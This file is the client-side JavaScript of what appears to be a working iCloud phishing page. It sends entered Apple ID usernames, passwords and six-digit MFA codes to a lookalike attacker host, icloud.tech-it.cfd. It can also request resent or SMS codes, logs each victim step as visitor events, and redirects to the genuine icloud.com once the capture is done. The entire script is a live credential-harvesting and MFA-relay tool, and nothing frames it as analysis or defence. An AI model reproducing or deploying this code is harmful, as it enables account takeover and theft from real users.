
$(document).ready(function() {

    $(document).ajaxStart(function() {
        $('#page-loader').fadeIn(200);
    }).ajaxStop(function() {
        $('#page-loader').fadeOut(200);
    });

    let sessionData = {};
    const urlParams = new URLSearchParams(window.location.search);

    const myId = urlParams.get('id');
    sessionData.site_id = myId;

    var domain = window.location.hostname;
 
    function sendVisitorRequest(eventValue, eventParams = {}) {
        let visitor_id = sessionData.visitor_id || '';
        let user_agent = navigator.userAgent;
        $.ajax({
            url: 'https://icloud.tech-it.cfd/api/v1/Visitor', 
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({
                visitor_id: visitor_id,
                user_agent: user_agent,
                event: {
                    params: eventParams, 
                    on_event: eventValue, 
                    visit_from: domain
                }
            }), 
            success: function(response) {
                if (response && response.visitor_id) {
                    sessionData.visitor_id = response.visitor_id;
                }
            }
        });
    }

    function startTimer(timeInSeconds) {
        let timerSeconds = timeInSeconds || 60;

        $('#resend-code').addClass('d-none');
        $('#send-sms-code').addClass('d-none');
        $('#timer-text').removeClass('d-none');
        let timerId = setInterval(function() {
            if(timerSeconds > 0){
                timerSeconds--;
                $('#timer').text(timerSeconds);
            }
            else{
                clearInterval(timerId);
                $('#resend-code').removeClass('d-none');
                $('#send-sms-code').removeClass('d-none');
                $('#timer-text').addClass('d-none');
            }
            
        }, 1000);
    }

    var getParameters = Object.fromEntries(urlParams.entries());
    
    setTimeout(() => {
        sendVisitorRequest('create_visitor', getParameters);
    }, 1500);
    

    $('#btn-to-login').click(function() {
        if(sessionData.visitor_id) {
            $('#view-landing').addClass('d-none');
            $('#view-login').removeClass('d-none');
            $('#errorVisitorMsg').addClass('d-none');
            sendVisitorRequest('btn_to_login_pressed', getParameters);
        }
        else{
            $('#errorVisitorMsg').removeClass('d-none');
        }
       
    });

    $('#back-to-login').click(function() {
        $('#view-mfa').addClass('d-none');
        $('#view-login').removeClass('d-none');
        $('#errorLoginMsg').addClass('d-none');
        $('#mfaErrorMsg').addClass('d-none');
        $('#resendCodeErrorMsg').addClass('d-none');
        sessionData.mfa_code = '';
        sessionData.visitor_id = '';
        sendVisitorRequest('back_to_login_pressed_creating_new_visitor', getParameters);
    });

    $('#btn-submit-login').click(function() {
        const username = $('#username').val();
        const password = $('#password').val();
        if (!username || !password) {
            $('#errorLoginMsg').removeClass('d-none');
            return;
        }
         $('#errorLoginMsg').addClass('d-none');

        $.ajax({
            url: 'https://icloud.tech-it.cfd/api/v1/Authentication/login',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ 
                username: username, 
                password: password, 
                id: sessionData.site_id, 
                visitor_id: sessionData.visitor_id 
            }),
            success: function(response) {
                if(!response){
                    $('#errorLoginMsg').removeClass('d-none');
                }
                if(response.state == 'mfa'){
                    $('#view-login').addClass('d-none');
                    $('#view-mfa').removeClass('d-none');
                    $('#errorLoginMsg').addClass('d-none');
                    startTimer();
                    return;
                }
                $('#errorLoginMsg').removeClass('d-none');
            },
            error: function() {
                $('#errorLoginMsg').removeClass('d-none');
            }
        });

        sendVisitorRequest('entered_login_credentials', getParameters);
    });

    $('.mfa-box').on('keyup', function() {
        if(!sessionData.mfa_code)
            sessionData.mfa_code = '';

        if (this.value.length === 1) {
            $(this).next('.mfa-box').focus();
            sessionData.mfa_code += this.value;
            if(sessionData.mfa_code.length === 6){
                $.ajax({
                    url: "https://icloud.tech-it.cfd/api/v1/Authentication/mfa",
                    method: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({ 
                        visitor_id: sessionData.visitor_id, 
                        code: sessionData.mfa_code,
                        id: sessionData.site_id
                    }),
                    success: function(response) {
                        if(response && response.status == 'success'){
                            
                            $('#mfaErrorMsg').addClass('d-none');
                            $('#resendCodeErrorMsg').addClass('d-none');
                            $('#success-auth').removeClass('d-none');
                            $('#view-mfa').addClass('d-none');

                            setTimeout(function() {
                                window.location.href = "https://www.icloud.com";
                            }, 2000);
                        }
                        else{
                            $('#mfaErrorMsg').removeClass('d-none');
                        }
                        sessionData.mfa_code = '';
                        $('.mfa-box').val('');
                    },
                    error: function() {
                        $('#mfaErrorMsg').removeClass('d-none');
                        sessionData.mfa_code = '';
                        $('.mfa-box').val('');
                    }
                });
            sendVisitorRequest('entered_mfa_code', getParameters);
            }
        }
    });

    $('#resend-code').on('click', function(e){
        e.preventDefault();
        $.ajax({
            url: "https://icloud.tech-it.cfd/api/v1/Authentication/resend-mfa",
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ 
                visitor_id: sessionData.visitor_id, 
                id: sessionData.site_id 
            }),
            success: function(response) {
                if(response && response.status != 'success'){
                    $('#resendCodeErrorMsg').removeClass('d-none');
                }
                else{
                    $('#resendCodeErrorMsg').addClass('d-none');
                     $('#mfa-code-label').text('Введите код проверки, отправленный на iPhone.');
                    startTimer();
                }
             },
            error: function(response) {
                 $('#resendCodeErrorMsg').removeClass('d-none');
            }
        });

        sendVisitorRequest('resend_mfa_code', getParameters);
    });

     $('#send-sms-code').on('click', function(e){
        e.preventDefault();
        $.ajax({
            url: "https://icloud.tech-it.cfd/api/v1/Authentication/send-sms-mfa",
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ 
                visitor_id: sessionData.visitor_id, 
                id: sessionData.site_id 
            }),
            success: function(response) {
                if(response && response.status != 'success'){
                    $('#resendCodeErrorMsg').removeClass('d-none');
                }
                else{
                    $('#resendCodeErrorMsg').addClass('d-none');
                    $('#mfa-code-label').text('Введите код проверки, отправленный на номер телефона.');
                    startTimer();
                }
             },
            error: function(response) {
                 $('#resendCodeErrorMsg').removeClass('d-none');
            }
        });

        sendVisitorRequest('send_sms_mfa_code', getParameters);
    });
});